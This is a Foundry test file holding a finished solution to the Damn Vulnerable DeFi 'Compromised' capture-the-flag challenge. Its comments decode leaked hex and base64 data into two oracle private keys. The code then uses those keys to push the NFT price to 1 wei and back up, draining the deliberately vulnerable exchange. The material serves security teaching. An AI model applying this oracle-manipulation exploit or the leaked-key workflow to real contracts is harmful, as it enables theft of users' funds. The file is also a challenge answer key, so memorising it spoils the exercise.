// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        // start the challenge by removing all spaces and lines from this output in the read me file:
        // 4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30
        // 4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35

        // that gives us this:
        // 4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a51304d4867324f474a6b4d444977595751784f445a694e6a5133595459354d574d325954566a4d474d784e5449355a6a49785a574e6b4d446c6b59324d304e5449304d5451774d6d466a4e6a426959544d334e324d304d545535

        // then we can use cast to turn that hex data into ascii in our command line like this:
        // cast --to-ascii "4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a51304d4867324f474a6b4d444977595751784f445a694e6a5133595459354d574d325954566a4d474d784e5449355a6a49785a574e6b4d446c6b59324d304e5449304d5451774d6d466a4e6a426959544d334e324d304d545535"
        // and that outputs:
        // MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0MHg2OGJkMDIwYWQxODZiNjQ3YTY5MWM2YTVjMGMxNTI5ZjIxZWNkMDlkY2M0NTI0MTQwMmFjNjBiYTM3N2M0MTU5

        // now we use base64 decoder to convert that ascii to base64 in our command line with:
        // echo "MHg3ZDE1YmJhMjZjNTIzNjgzYmZjM2RjN2NkYzVkMWI4YTI3NDQ0NDc1OTdjZjRkYTE3MDVjZjZjOTkzMDYzNzQ0MHg2OGJkMDIwYWQxODZiNjQ3YTY5MWM2YTVjMGMxNTI5ZjIxZWNkMDlkY2M0NTI0MTQwMmFjNjBiYTM3N2M0MTU5" | base64 -d
        // and that outputs:
        // 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c9930637440x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159

        // This finally looks familiar. We can separate these at the 0x prefixes that indicate Ethereum style hex strings which gives us the following:
        // 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
        // 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
        // Which looks like private keys that have been exposed through their server

        // Lets investigate and see what addresses these keys are from using cast in our command line:
        // cast wallet address --private-key 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
        // cast wallet address --private-key 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
        // Which gives us:
        // 0x188Ea627E3531Db590e6f1D71ED83628d1933088
        // 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
        // respectively

        uint256 leakedPrivateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        address leakedAddress1 = 0x188Ea627E3531Db590e6f1D71ED83628d1933088;

        uint256 leakedPrivateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
        address leakedAddress2 = 0xA417D473c40a4d42BAd35f147c21eEa7973539D8;

        // these seem to be the private keys associated with the trusted sources that set the prices with the TrustfulOracle::postPrice function
        // check by making sure they have the expected roles and balances
        assert(oracle.hasRole(oracle.TRUSTED_SOURCE_ROLE(), leakedAddress1));
        assert(oracle.hasRole(oracle.TRUSTED_SOURCE_ROLE(), leakedAddress2));
        assertEq(leakedAddress1.balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        assertEq(leakedAddress2.balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);

        string memory nftSymbol = "DVNFT";

        // lower oracle prices from both trusted sources to 1 WEI since sending an amount of zero to Exchange::buyOne would trigger a revert
        vm.startBroadcast(leakedPrivateKey1);
        oracle.postPrice(nftSymbol, 1);
        vm.stopBroadcast();

        vm.startBroadcast(leakedPrivateKey2);
        oracle.postPrice(nftSymbol, 1);
        vm.stopBroadcast();

        console.log("lowered median price: ", oracle.getMedianPrice(nftSymbol));

        // nft price is now 1 WEI so we can essentially buy one for free
        vm.prank(player);
        uint256 nftId = exchange.buyOne{value: 1}();

        // raise oracle prices from both trusted sources to the exchanges current contract balance
        vm.startBroadcast(leakedPrivateKey1);
        oracle.postPrice(nftSymbol, address(exchange).balance);
        vm.stopBroadcast();
        vm.startBroadcast(leakedPrivateKey2);
        oracle.postPrice(nftSymbol, address(exchange).balance);
        vm.stopBroadcast();

        console.log("increased median price: ", oracle.getMedianPrice(nftSymbol));

        vm.startPrank(player);
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
        recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
        vm.stopPrank();

        // return oracle prices back to normal
        vm.startBroadcast(leakedPrivateKey1);
        oracle.postPrice(nftSymbol, INITIAL_NFT_PRICE);
        vm.stopBroadcast();
        vm.startBroadcast(leakedPrivateKey2);
        oracle.postPrice(nftSymbol, INITIAL_NFT_PRICE);
        vm.stopBroadcast();

        console.log("restored median price: ", oracle.getMedianPrice(nftSymbol));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
